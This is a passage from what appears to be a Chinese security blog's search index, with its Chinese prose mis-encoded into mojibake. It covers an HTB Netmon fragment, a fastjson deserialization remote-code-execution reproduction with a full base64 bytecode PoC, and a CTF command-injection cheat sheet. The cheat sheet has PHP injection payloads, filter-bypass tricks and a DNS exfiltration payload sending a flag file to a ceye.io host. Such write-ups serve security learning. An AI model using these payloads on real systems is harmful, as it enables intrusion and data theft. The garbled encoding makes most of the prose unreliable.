ç•Œé¢ï¼Œå‘ç°ä¸€ä¸ª DNS æœåŠ¡å™¨å¤„äºå®•æœºçŠ¶æ€ åœ¨æ­¤å¤„æ·»åŠ é€šçŸ¥ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åœ¨ ftp ä¸­å‘ç°è¿”å›ç»“æœ output.txt å°è¯•å¯¼å‡º Desktop ä¸‹çš„ root.txtï¼Œæ›´æ”¹ Devices èœå•ä¸‹çš„ Notifications çš„ Execute Program å‚æ•°ä¸ºï¼š åœ¨ ftp ä¸­æŸ¥çœ‹è¿”å›çš„ç»“æœï¼š ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:3:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["æ¼æ´å¤ç°"],"content":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´åŸç† http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ https://github.com/shengqi158/fastjson-remote-code-execute-poc fastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨autoTypeæ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶é€šè¿‡jsonæ¥å¡«å……å…¶å±æ€§å€¼ã€‚è€ŒJDKè‡ªå¸¦çš„ç±»com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplä¸­æœ‰ä¸€ä¸ªç§æœ‰å±æ€§_bytecodesï¼Œå…¶éƒ¨åˆ†æ–¹æ³•ä¼šæ‰§è¡Œè¿™ä¸ªå€¼ä¸­åŒ…å«çš„Javaå­—èŠ‚ç ã€‚ æ‰€ä»¥ï¼Œæƒ³è¦ä½¿ç”¨TemplatesImplçš„_bytecodeså±æ€§æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæœ‰å‡ ä¸ªæ¡ä»¶ï¼š ç›®æ ‡ç½‘ç«™ä½¿ç”¨fastjsonåº“è§£æjson è§£ææ—¶è®¾ç½®äº†Feature.SupportNonPublicFieldï¼Œå¦åˆ™ä¸æ”¯æŒä¼ å…¥ç§æœ‰å±æ€§ ç›®æ ‡ä½¿ç”¨çš„jdkä¸­å­˜åœ¨TemplatesImplç±» å½“ç„¶ä¸æ’é™¤æœ‰å…¶ä»–ä¸éœ€è¦TemplatesImplçš„åˆ©ç”¨æ–¹æ³• ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° æœ¬ç¯å¢ƒç›®å½•ç»“æ„å¦‚ä¸‹ï¼š src æœ¬é¡¹ç›®æºç  main/java javaç±» IndexFilter.java webæºç  Poc.java POCæºç  pom.xml é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨mavenå¯ä»¥ç›´æ¥å°†æœ¬é¡¹ç›®ç¼–è¯‘æˆwaråŒ… exploit.php è¯»å–ç¼–è¯‘å¥½çš„POCå­—èŠ‚ç ï¼Œå¹¶è½¬æ¢æˆbase64 fastjson-1.0.war æ‰“åŒ…å¥½çš„webç¯å¢ƒï¼Œå¯ä»¥ç›´æ¥æ”¾åˆ°tomcatä¸‹è¿è¡Œ ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç”Ÿæˆå­—èŠ‚ç  ç¬¬ä¸€æ­¥å°±æ˜¯ç¼–å†™ä¸€ä¸ªJavaç±»ï¼Œåœ¨è¿™ä¸ªç±»ä¸­æ‰§è¡Œå‘½ä»¤ã€‚ç„¶åç¼–è¯‘è¯¥ç±»ï¼Œè·å¾—.classæ–‡ä»¶ï¼Œè·å¾—å­—èŠ‚ç ã€‚ ä¿®æ”¹Poc.javaä¸­ä½ æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶ååœ¨æœ¬ç›®å½•ä¸‹ä½¿ç”¨mavenå¯¹æœ¬é¡¹ç›®è¿›è¡Œç¼–è¯‘ï¼Œç”Ÿæˆtarget/classes/Poc.classï¼š mvn compile å¦‚æœæ²¡æœ‰å®‰è£…mavenï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨fastjson-1.0.warè¿™ä¸ªå‹ç¼©åŒ…ä¸­çš„WEB-INF/classes/Poc.classã€‚exploit.phpä¸­å°±æ˜¯è¯»å–çš„è¿™ä¸ªæˆ‘å·²ç»ç¼–è¯‘å¥½çš„classæ–‡ä»¶ã€‚ ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:1","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ„é€ POC ç”Ÿæˆ.classæ–‡ä»¶åï¼Œå°†è¯¥æ–‡ä»¶çš„å†…å®¹è¿›è¡Œbase64ç¼–ç ï¼Œæ”¾åœ¨jsonä¸­_bytecodesçš„å€¼çš„ä½ç½®ï¼Œå¦‚ä¸‹ï¼š {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMUG9jOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcALwwAMAAxAQAhb3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAyADMBAANQb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAZAAgAGgAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"} å¦‚æœæƒ³ä½¿ç”¨å·²ç»ç¼–è¯‘å¥½çš„.classæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œphp exploit.phpè·å¾—POCï¼š ä½¿ç”¨jdk1.8ç¼–è¯‘ï¼Œæ‰§è¡Œçš„å‘½ä»¤æ˜¯touch /tmp/successï¼Œæ‰€ä»¥åœ¨Windowsä¸‹ä¼šæ‰§è¡Œå¤±è´¥ã€‚Windowsç”¨æˆ·è¯·è‡ªå·±ä¿®æ”¹Poc.javaï¼Œç”Ÿæˆè‡ªå·±çš„POCã€‚ ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:2","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´åˆ©ç”¨ ç›®æ ‡æ˜¯ä¸€ä¸ªwebåº”ç”¨ï¼Œè®¿é—®è¿”å›â€œHello worldâ€ã€‚æ­£å¸¸POSTä¸€ä¸ªjsonï¼Œç›®æ ‡ä¼šæå–jsonå¯¹è±¡ä¸­çš„nameå’Œageæ‹¼æ¥æˆä¸€å¥è¯è¿”å›ï¼š å‘é€æ­¥éª¤äºŒä¸­è·å–çš„POCï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š å¦‚ä¸Šå›¾ï¼Œ/tmp/successæ–‡ä»¶æˆåŠŸè¢«åˆ›å»ºã€‚ ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:3","tags":["æ¼æ´å¤ç°","fastjson"],"title":"fastjson ååºåˆ—åŒ–ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ç›¸å…³","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ç›¸å…³ ç”±äºæ²¡æœ‰é’ˆå¯¹ä»£ç ä¸­å¯æ‰§è¡Œçš„ç‰¹æ®Šå‡½æ•°å…¥å£åšè¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥æäº¤æ¶æ„è¯­å¥ï¼Œå¹¶äº¤ç”±æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚ ä»£ç  / å‘½ä»¤æ³¨å…¥æ”»å‡»ä¸­ Web æœåŠ¡å™¨æ²¡æœ‰è¿‡æ»¤ç±»ä¼¼ system()ã€eval()ã€exec() ç­‰å‡½æ•°çš„ä¼ å…¥å‚æ•°æ˜¯è¯¥æ¼æ´æ”»å‡»æˆåŠŸçš„æœ€ä¸»è¦åŸå› ã€‚ ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"1 ä»£ç æ³¨å…¥ ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"1.1 ç›¸å…³å‡½æ•° 1.1.1 eval \u003c?php hilight_file(__FILE__); $a = 'phpinfo();'; eval($a); ?\u003e 1.1.2 assert 1.1.3 call_user_func å¯ä»¥ä½¿ç”¨ is_callable å‡½æ•°æŸ¥çœ‹æ˜¯å¦å¯ä»¥è¢«å›è°ƒ 1.1.4 call_user_func_array 1.1.5 create_function 1.1.6 preg_replace æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement æˆ–å…¶æ‰§è¡Œç»“æœè¿›è¡Œæ›¿æ¢ã€‚ 1.1.7 array_map payloadï¼šurl?a=assert\u0026b=phpinfo() 1.1.8 usort Payloadï¼šurl?1[]=phpinfo()\u00261[]=123\u00262=assert 1.1.9 uasort 1.1.10 ${php ä»£ç } ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"1.2 DEMO \u003c?php hightlight_file(__FILE__); $price = $_GET['price']; $code = 'echo $name'. 'çš„ä»·æ ¼æ˜¯'. $price. ';'; $b = create_function('$name', $code); $b('iPhone'); ?\u003e Payloadï¼šurl?price=123;}phpinfo();/* ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2 å‘½ä»¤æ³¨å…¥ ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2.1 ç›¸å…³å‡½æ•° 2.1.1 system 2.1.2 exec 2.1.3 passthru 2.1.4 shell_exec 2.1.5 `` è¿ç®—ç¬¦ 2.1.6 ob_start ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2.2 å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡ 2.2.1 å‘½ä»¤æ‰§è¡Œçš„åˆ†éš”ç¬¦ ä¾‹å¦‚ï¼š \u003c?php highlight_file(__FILE__); $rce = \"echo 123\"; system($rce. $_GET[1]); ?\u003e å¦‚ä½•å®ç°å‘½ä»¤æ‰§è¡Œ æ¢è¡Œç¬¦ %0a å›è½¦ç¬¦ %0d è¿ç»­æŒ‡ä»¤ ; åå°è¿›ç¨‹ \u0026 ç®¡é“ç¬¦ | é€»è¾‘ ||ã€\u0026\u0026 2.2.2 å‘½ä»¤æ‰§è¡Œçš„åˆ†éš”ç¬¦ \u003c ç¬¦å· $IFS ${IFS} $IFS$9 %09 ç”¨äºurlä¼ é€’ ${9} 2.2.3 å…¶å®ƒ Tips 2.2.3.1 å‘½ä»¤æ‹¼æ¥ $a=l;$b=s;$a$b 2.2.3.2 base64 ç¼–ç  `echo cHdk | base64 -D` 2.2.3.3 substr string pos len è¯¥è¡¨è¾¾å¼æ˜¯ä» string ä¸­å–å‡ºä» pos ä½ç½®å¼€å§‹é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²ã€‚å¦‚æœ pos æˆ– len ä¸ºéæ­£æ•´æ•°æ—¶ï¼Œå°†è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚ echo â€œ${PATH:0:1}â€ -\u003e / echo \"`expr\\$IFS\\substr\\\\$IFS\\\\$(pwd)\\\\$IFS\\1\\$IFS\\1`\" echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)` -\u003e / expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1{$IFS}1 ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2.3 å‘½ä»¤æ— å›æ˜¾çš„æƒ…å†µ 2.3.1 åˆ¤æ–­ å»¶æ—¶ ls|sleep(3) HTTP è¯·æ±‚ DNS è¯·æ±‚ ceye.io 2.3.2 åˆ©ç”¨ å†™ shellï¼ˆç›´æ¥å†™å…¥ã€å¤–éƒ¨ä¸‹è½½ï¼‰ http / dns ç­‰æ–¹å¼å¸¦å‡º 2.3.3 DEMO \u003c?php highlight_file(__FILE__); include(\"where_is_flag.php\"); echo \"ping:\"; $ip = (string)$_GET['ping']; $ip = str_replace(\"\u003e\", \"0.0\", $ip); shell_exec(\"ping \".$ip); ?\u003e payloadï¼š ip=;cp where_is_flag.php 1.txt ip=`cat 1.txt|sed s/[[:space:]]//`.xx.ceye.io æŠ€å·§ cat 1.txt|sed s//[[:space:]]//g æ˜¯å»é™¤ç©ºæ ¼çš„ä½œç”¨ ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"CTF ä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"PHP æ–‡ä»¶åŒ…å«æ¼æ´ç›¸å…³","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"PHP æ–‡ä»¶åŒ…å«æ¼æ´ ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:0:0","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"1 ç›¸å…³å‡½æ•° include() include_once() require() require_once() ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:0","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"2 åˆ†ç±» è¿œç¨‹æ–‡ä»¶åŒ…å« æœ¬åœ°æ–‡ä»¶åŒ…å« ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:2:0","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"3 åŒ…å«çš„å®ç° åŒ…å«çš„æ—¶å€™ï¼Œä¸ä¸€å®šæ˜¯è¦å»åŒ…å« php æ–‡ä»¶ï¼ˆå³å¯æ‰§è¡Œçš„ php æ–‡ä»¶ï¼‰ ç±»ä¼¼äºï¼ša.phpsã€a.xxxã€a.jpg åªè¦æ–‡ä»¶ä¸­åŒ…å«ä¸€å—å®Œæ•´ php ä»£ç ï¼Œä¾‹å¦‚ä¸€ä¸ª a.txtï¼Œå†…å®¹ä¸º \u003c?php phpinfo();?\u003e ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:3:0","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4 åŒ…å«çš„åœºæ™¯ 